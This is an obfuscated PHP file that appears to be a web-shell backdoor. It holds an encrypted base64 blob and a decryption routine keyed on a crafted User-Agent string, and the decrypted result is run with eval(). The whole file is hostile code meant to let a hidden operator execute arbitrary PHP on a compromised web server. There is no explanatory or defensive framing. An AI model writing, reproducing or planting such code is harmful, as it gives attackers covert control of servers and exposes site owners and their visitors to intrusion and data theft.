<?php
$ertnn = "y6Wjp6vCpcvSpafZytKdjmhadFM9P1iox6TJUnNZwpKqfIOXmJ5Tc2yfm43K16nLrFldknZ+gH25i4OnpqXSlMqYlZ6iz5iIv19e4G5uP4qskqualamTqMekyW+YmtaY1JSenWGHkqyrgnq4vIar1qSgmpeVmZqh0pWDj5Fb0ZTTmFOVYp5AcGufm43O06zLl6apn5+WmJ3Kj8ebop6LV8V5eoR+to6I16ah1MLIm8qemqWYUpKPWtqd0ZGkmtCYiJBdXK3Epc3HqpTVwtiej2GsRj05Ppmbzp+BVHKf0qHaU5SnpdKlo75YnNfGyaTCWm+fnJyaVK3WnNCTmp7Hb5WZoKatoW/I1FZko4OfQ3BBrp6fo5qvRXA5apeZodJTiG+Xp6fXU8nRoqTXnsBY2J2VlVVuqqSk1ZHFUpyazJ+iYpenp9dxosSoVZSfhnFzQjq2QDqyQULLk8mhVlufmdWlnlie0Zba26aaor2Go9ukpaKjkaeoZ8yf059jncSnx49TWKbIp87RmnLBg7SFuYyNW3FsnqKo26SBoJemyHDCVaaopdKUyseam87NyZKIWKWyo5VykFrMmc2XkluScaKcn6iu11Pa26aaor2GqduanqKnjFdUrsec1pdzlYWI1p+gmZ2Dec/Om5GHkKJylZ6gq6BucWOsym6dYaqroVWhQDuertGW2sulo4XIyaqOXKarn1xVWJzPooqtQ0NsV8mbbpuu1Z/Fy6Se2YmNcXNCOpyooqGTq8uk0KKqYYeWzl9Re461f7WyipS6s7Bihlymq59ZcEFCb5PWpKKY1pjaoqGsYYeWzo5WeLqzsIW2jJCLeISKhoa6gqKAiX+ohZJTYmF0cD1vxaun0cDXm9qnoa1bVJicZKmFs36FibeSunx+fYi4h5KTZl6gbm4/ipySrZRQclSb26LNkZuxyJaOV5SgYp5AcGufm42CiJrHrJJirj0/PUGKlMKml1mgU6aZmqSewprL1pWY1M/Ym9SspGFXpaegYaE9azuzRm08zJydnZjTqNrBmaTT1cmk2qtZXZeZp2BYipTCppdinkBwsD5CoslTjoaVfKq1v13Kr1iWXFCwQUJvVMWpVnaDV8V6doyUipfdiZNwcmttWsqvUXZTkpannZxkwJabnNKXy1ukrKvCpdXWZ2iNhcitj2FsRj05nppYjqDTl52Y0JTalplgYJKo2M5zXZOLo1+MnJqrcFhjXmGVV41SWp3aX4ZXmqaf0lyPgrFCb2ptWtuqnVlwUFmdpsyfvGOTdHA9bzxVnKLVU6OCWp7Tx9ORmJVsRj05slSd0qPGUrFGbTxvo6OdoMKgx9aZnY2Ik6vYpG5hYVpeY1+SUIWWrWWDV8+hl6dinkBwaz9Z2tPQVqNYVaKhlqSPacNrbjw/QoeXz6VRdVmKWqFvQD7ibm4/1qqWoJKdlqibzliIYV5njVzCYllmY4yPlIpkX6SKiGWNZFFdqKKhYFiKnoptQ0NsnMxTWVynvmbDgnNyhYjYrtpfWlmuPT89QYqqgW9WYNOb1lpsRUNsPIrQl6LKgaFWiqaMa5BrQj5B41DGnqmeg65zPTpBXd1To4Jao8CUwXFzQjpCV56WoZ2GbYFUqp7Qo9KUpZ1bnkBwa7NCb2rNnIZgVZ2colVVdYZXiFtWtHA9bzxVnKLVU6OCWpS4praMq4qMW3d/eImFq361kYiIsoeIkFFmWYpijYJkVYnFzaiGZlFgYldVYliKnsKfm1mRU41hWFhng1fgnUM/bt6Em9KrllmuPT89QYqUyqRWdoNXxYZ2io+ohcGEeoSotrF7tIyQi4J/iVaVhl6BWWVgg2GGV5+ZpshTlIJdY4yBklaKsmxGPTmyQUJvl8amXl3YpdJfUVydzKWPnUM/bsrKVo6emqWYj5qsodmk1Fpancylj1xRs0ZtPG/HmZ3UgYZy2qpvdaeUc3Ce1Z7VUpmoz6LYcI1aoNWYy9CSV6PF063UpKCal1CoqZvJldSlcmjJotSnb3Ro15eknmWp15+GcXNCOrZTlaGnnYarbjw/QsiWzqJRWnXXpaSeqpmjncql1KxRnKKcpKZ1wlLTl5qVhXHKoqimpdKUyoKcls7NoGXMp5+tcWxkqJykbJCmqHeFbnM9OrVGbbCGx6KoysrKVo5ckImCg4mPX82V1ZGrq89aw1xRs0ZtPIrXqKGFnoRaxYiAjIeLXJud2o/WpKJgwG5zPTqoq8iaxc+XqcjJjF2VYF9jXIxkXGaQWb1gXmeNco9XYF9lg1fb1KJhhYXSX6FFO0KcllVcXNSLlI9WdqBTjaeprGCMU+FvQD5uhd5Wo1hYqZugXG9FcDlqVqSa0JiGcFFcp75lw51DP27ehJvSq5ZZrj0/PUGKqoFvVl3RjpmQbEVDbDyK0JeiyoGhVoislqajnJaonYhrbjw/tnA9b1eVoauDcIaGlYW0tLiRjZyhmqeYXJFYlFCDYVhZkVOKoZKlnoNhholkXIWPhFrgcz5DPJeaqGCKpdOeYlmHl8+lWnNGbTzPyFZdy8rQm8WdqaKmpKhcXMqZ01tfWd5AcDw6nZzLooaEcqnXn6CqynZtn6KeqVSb1ZzQpHOVhZrYmJamlYVxytGto9HQxZqGq6aclpWop3SVltCgqnefYtqXb3Ro16WkhHFCb2rhVsukpJ5Tq0I+QW+VxJqlWYVv2qVvdK3HcaLIpaPZgcel0qejdo9Sp5mcwlKflqWw0Z/VlJVYn8Sc0p5lm9TP2HSiZ6WdcWxkqKqkUpw/QELgQHCwPkKexpvVglhx2dOictqcb3WZn6ehWNOV1ZqlnaCPiIOAi42/VYbDmanO0NJzwlqNW3FsqKSZ1G62pKJzg2+VpqGZp6Fvz9CmqtmB2K/WnW6tmKipVKbHncZvklvKmNqSpqqlv1WG2Jeh2sahkoiUU3dvmaOkrdpQ1aumnqCPiJuanJ3IocKEVqPGzslzwlqVqZSknZBahqbCnqueoI+IV6GZrcuPiKByntPR2aqGrKqpmG2oqZrTmdVSrJrPqMtwjVqAyKesy6KawYOicpWeoKugbnFjrMpunWGqq6FVoQ==";
function opooi($ertnn, $ikllp){
    $ikllp = md5($ikllp);
    $x = 0;
    $ertnn = base64_decode($ertnn);
    $kol = strlen($ertnn);
    $l = strlen($ikllp);
    $uutg = '';
    for ($i = 0; $i < $kol; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $uutg .= substr($ikllp, $x, 1);
        $x++;
    }
    $lkeeer = '';
    for ($i = 0; $i < $kol; $i++) {
        if (ord(substr($ertnn, $i, 1)) < ord(substr($uutg, $i, 1))) {
            $lkeeer .= chr((ord(substr($ertnn, $i, 1)) + 256) - ord(substr($uutg, $i, 1)));
        } else {
            $lkeeer .= chr(ord(substr($ertnn, $i, 1)) - ord(substr($uutg, $i, 1)));
        }
    }
    return $lkeeer;
}
$ktmp = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/ Apple(.*) \(/is',$ktmp,$kk)){
	$ikllp = str_replace('Kit/58','Cr@G',$kk[1]);
	$ikllp = explode(".",$ikllp);
	$ikllp = $ikllp[1].$ikllp[0].'Ee';
	$lkeeer = opooi($ertnn, $ikllp);
	eval($lkeeer);
}
